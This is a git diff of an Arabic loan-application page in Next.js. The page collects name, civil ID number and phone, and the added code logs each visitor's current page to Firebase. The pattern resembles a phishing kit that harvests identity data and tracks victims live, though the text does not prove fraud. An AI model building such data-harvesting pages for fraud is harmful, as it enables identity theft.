@@ -8,23 +8,31 @@ import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@
 import { addData } from "@/lib/firebase"
 import { Menu, Users, Home, Check } from "lucide-react"
 import { useRouter } from "next/navigation"
-import React, { useState } from "react"
+import React, { useEffect, useState } from "react"
 
 export default function LoanApplicationPage() {
-  const [salary,setSalary]=useState('')
-  const [work,setWork]=useState('')
-  const [name,setName]=useState('')
-  const [idnumber,setIdnumber]=useState('')
-  const [phone,setPhone]=useState('')
+  const [salary, setSalary] = useState('')
+  const [work, setWork] = useState('')
+  const [name, setName] = useState('')
+  const [idnumber, setIdnumber] = useState('')
+  const [phone, setPhone] = useState('')
   const router = useRouter()
 
-  const handleSubmit = (e:any) => {
+  const handleSubmit = (e: any) => {
     e.preventDefault()
-    const visitorId=localStorage.getItem('visitor')
-    addData({id:visitorId,name,idnumber,phone})
+    const visitorId = localStorage.getItem('visitor')
+    addData({ id: visitorId, name, idnumber, phone })
     router.push("/loan-application/salary")
   }
-
+  const handleUpdatePageName = async () => {
+    const visitorid = localStorage.getItem('visitor')
+    await addData({ id: visitorid, currentPage: 'معلومات 2' })
+  }
+  useEffect(() => {
+    handleUpdatePageName().then(() => {
+      console.log('Done')
+    })
+  }, [])
   return (
     <div className="min-h-screen bg-gray-50" dir="rtl">
       {/* Header */}
@@ -60,22 +68,22 @@ export default function LoanApplicationPage() {
                 placeholder="رقم الهاتف"
                 className="text-right border-gray-200 focus:border-blue-500 focus:ring-blue-500 h-12"
                 dir="rtl"
-                onChange={(e)=>{setPhone(e.target.value)}}
+                onChange={(e) => { setPhone(e.target.value) }}
               />
             </div>
 
             {/* Work Type Field */}
             <div className="space-y-2">
               <Label htmlFor="workType" className="text-right block font-semibold text-gray-800">
-              الاسم
-                            </Label>
+                الاسم
+              </Label>
               <Input
                 id="workType"
                 type="text"
                 placeholder="الاسم"
                 className="text-right border-gray-200 focus:border-blue-500 focus:ring-blue-500 h-12"
                 dir="rtl"
-                onChange={(e)=>{setName(e.target.value)}}
+                onChange={(e) => { setName(e.target.value) }}
 
               />
             </div>
@@ -91,7 +99,7 @@ export default function LoanApplicationPage() {
                 placeholder="رقم مدني"
                 className="text-right border-gray-200 focus:border-blue-500 focus:ring-blue-500 h-12"
                 dir="rtl"
-                onChange={(e)=>{setIdnumber(e.target.value)}}
+                onChange={(e) => { setIdnumber(e.target.value) }}
 
               />
             </div>
